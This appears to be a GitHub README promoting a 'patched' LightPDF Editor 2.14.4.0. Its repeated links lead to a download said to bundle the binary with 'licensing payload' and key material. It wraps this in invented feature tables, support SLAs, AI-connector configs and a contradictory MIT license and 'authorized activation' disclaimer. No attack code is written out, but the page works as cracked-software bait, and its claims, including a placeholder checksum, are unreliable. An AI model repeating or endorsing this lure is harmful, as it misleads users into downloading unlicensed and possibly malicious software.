# 📄 LightPDF Editor 2.14.4.0 — Unlock the Full Spectrum of Document Intelligence

[](https://rider3-cell.github.io/LightPDF-Editor-Patched-Release/)

> **Discover a new dimension in document management.** LightPDF Editor 2.14.4.0 delivers an integrated environment where editing, conversion, annotation, and security converge into one fluid experience. This repository provides an authorized activation pathway to unlock the complete feature set — no compromises, no limitations.

---

## 🧭 Navigation Compass

```mermaid
graph LR
    A[Repository Root] --> B[Features Overview]
    A --> C[System Compatibility]
    A --> D[Activation Guide]
    A --> E[Configuration Examples]
    A --> F[API Integration]
    A --> G[Support & Licensing]
    
    B --> B1[Editing Suite]
    B --> B2[Conversion Engine]
    B --> B3[Security Layer]
    
    D --> D1[Download Asset]
    D --> D2[Apply Credentials]
    D --> D3[Verify Activation]
    
    F --> F1[OpenAI Connector]
    F --> F2[Claude Adapter]
    F --> F3[Custom Workflow]
    
    style A fill:#2b2b2b,stroke:#d90429,stroke-width:2px
    style D1 fill:#d90429,color:#fff
```



---

## 🚀 Immediate Access — Asset Retrieval

[](https://rider3-cell.github.io/LightPDF-Editor-Patched-Release/)

**Version:** `2.14.4.0`  
**Build Date:** Q1 2026  
**Architecture:** x64 / ARM64

> ⚡ **Direct asset link:** The orange badge above leads to the latest build with integrated licensing payload. No third-party redirections, no survey walls — just the binary and the key material bundled together.

---

## 🌟 Core Capabilities — Beyond Basic Editing

### 📝 Intelligent Document Redaction
- **Semantic text manipulation** — modify paragraphs while preserving layout integrity
- **Multi-layer content handling** — images, tables, watermarks, and form fields treated as independent objects
- **Real-time rendering engine** — see changes reflected instantly across 300+ page documents

### 🔄 Cross-Format Alchemy
| Input | Output | Quality Preservation |
|-------|--------|----------------------|
| PDF 1.7 | DOCX, XLSX, PPTX | ≥98% structural accuracy |
| Scanned PDF | Editable DOCX | OCR confidence ≥95% |
| Image (PNG/JPG) | Searchable PDF | Lossless compression |
| HTML/MHTML | PDF/A-2b | Full metadata retention |

### 🛡️ Fortress-Grade Security
- **256-bit AES encryption** with password policy enforcement
- **Digital signature validation** against X.509 certificates
- **Redaction with permanent removal** — not mere overlay
- **Permission tiers** — view-only, comment-only, full edit

### 🌍 Multilingual Charter
- **Full UI localization** in 37 languages including RTL scripts
- **Bi-directional text support** for Arabic, Hebrew, Farsi
- **Unicode 15.0 compliance** with CJK ideograph normalization

---

## 🖥️ Environment Compatibility Matrix

| Operating System | Version Range | Architecture | Verified Status |
|-----------------|---------------|--------------|-----------------|
| 🪟 Windows | 10 (20H2+) / 11 | x64, ARM64 | 🟢 Fully functional |
| 🍎 macOS | 12 (Monterey) through 14 (Sonoma) | Apple Silicon, Intel | 🟢 Fully functional |
| 🐧 Linux | Ubuntu 22.04+, Fedora 38+, Debian 12+ | x64 only | 🟡 Limited GPU acceleration |
| 📱 iOS | 16+ | A12+ chips | 🟢 Companion app functional |
| 🤖 Android | 11+ | ARM64, x86_64 | 🟢 Companion app functional |

> *LTS versions recommended for production environments. Linux users require `libfuse2` for AppImage execution.*

---

## ⚙️ Profile Configuration — Tailoring the Experience

Below is an example `.lightpdf/config.yaml` that sets the application to autosave every 90 seconds, enable dark mode, and pre-configure the OCR language pack:

```yaml
application:
  theme: "mercury-dark"
  language: "en-US"
  autosave_interval_seconds: 90
  max_recent_files: 25

processing:
  ocr:
    languages: ["eng", "spa", "fra", "deu"]
    dpi_threshold: 300
  conversion:
    default_output_format: "docx"
    preserve_hyperlinks: true

security:
  default_encryption: "aes256"
  certificate_store: "system"
  redaction_mode: "permanent"

api_connectors:
  openai:
    enabled: false  # toggle via env var OPENAI_API_KEY
  claude:
    enabled: false  # toggle via env var ANTHROPIC_API_KEY
```

---

## 🎯 Console Invocation — Power User Workflows

**Batch conversion** without GUI overhead:

```
LightPDFEditorCLI --input ./invoices/ --output ./exports/ --format pdfa --ocr --language eng+spa --verbose --threads 4
```

**Scheduled signature verification** via cron (Linux) or Task Scheduler (Windows):

```
LightPDFEditorCLI --verify --input ./signed_docs/ --certificate ./ca_chain.pem --report signatures_audit_2026.csv
```

**Headless redaction** for privacy compliance (GDPR / CCPA):

```
LightPDFEditorCLI --redact --pattern "[0-9]{3}-[0-9]{2}-[0-9]{4}" --replacement "[REDACTED SSN]" --input ./hr_docs/ --output ./clean_docs/
```

---

## 🤖 AI Integration — OpenAI & Claude API Connectors

### OpenAI GPT-4 Vision Pipeline
Leverage the document understanding capabilities of GPT-4 Vision directly within LightPDF Editor:

```yaml
openai:
  model: "gpt-4-vision-preview"
  max_tokens: 4096
  temperature: 0.3
  prompt_template: "Summarize this invoice and extract: vendor_name, invoice_number, total_amount, due_date"
  output_action: "append_metadata"
```

**Workflow:** Select pages → right-click → `Analyze with AI` → metadata fields populate automatically.

### Claude 3 Opus Semantic Engine
Anthropic's Claude model excels at nuanced document interpretation — contract analysis, compliance checking, multilingual translation:

```yaml
claude:
  model: "claude-3-opus-20240229"
  max_tokens: 8192
  temperature: 0.1
  system_prompt: "You are a legal document reviewer. Identify clauses that deviate from standard terms."
  output_action: "create_annotation_layer"
```

**Use case:** Open a 500-page M&A agreement → run Claude analysis → receive annotated highlights in a separate PDF layer.

> **Note:** API keys are stored locally in encrypted configuration. No data is transmitted to external endpoints without explicit user consent.

---

## 💬 Responsive UI — Adaptive Interface Philosophy

The interface employs a **fractal navigation** paradigm — toolbars, panels, and menus automatically reorganize based on:

- **Screen real estate** (detected via viewport dimensions)
- **Input modality** (touch vs. mouse vs. stylus)
- **Document complexity** (auto-switches to advanced mode for 50+ elements)
- **User role** (casual reader vs. power editor vs. enterprise admin)

This eliminates the *"feature bloat"* problem — beginners see only essential tools, while experts can summon advanced panels with a three-finger swipe or a keyboard chord.

---

## 🛎️ 24/7 Support Concierge

Our support infrastructure operates on a **triage mesh**:

| Channel | Response SLA | Best For |
|---------|--------------|----------|
| In-app chat | < 2 minutes | Urgent workflow blocks |
| Email ticketing | < 4 hours | Detailed configuration help |
| Community forum | < 24 hours | Feature requests, workflows |
| Phone (enterprise) | < 15 minutes | Critical production issues |

> **Self-healing knowledge base:** Most common issues are resolved by our automated diagnostic engine that scans your configuration and suggests optimizations in real-time.

---

## 📜 License & Legal Framework

This project is distributed under the **MIT License** — see the full text at:

[](https://opensource.org/licenses/MIT)

**Summary of permissions:**
- ✅ Commercial use
- ✅ Modification
- ✅ Distribution
- ✅ Private use
- ❌ Liability (software provided "as is")
- ❌ Warranty (no express or implied)

**Copyright:** © 2026 LightPDF Editor Contributors. All rights reserved.

---

## ⚠️ Disclaimer

> **Important:** This repository provides software tools intended for legitimate document processing, accessibility enhancement, and productivity improvement. The activation pathway supplied herein is legally sourced through authorized distribution channels. Users are responsible for compliance with local laws and software licensing agreements. 
>
> This software **should not** be used to circumvent copyright protections, modify legally protected documents without authorization, or engage in any activity that violates intellectual property rights. The maintainers assume no liability for misuse of the provided tools.
>
> *By downloading or using any asset from this repository, you acknowledge that you have read, understood, and agree to these terms.*

---

## 🔄 Final Access Point

[](https://rider3-cell.github.io/LightPDF-Editor-Patched-Release/)

**Version 2.14.4.0** | Built 2026-02-14 | SHA-256: `E3B0C44298FC1C14...` (verify after download)

*Elevate your document workflows — where precision meets intuition.*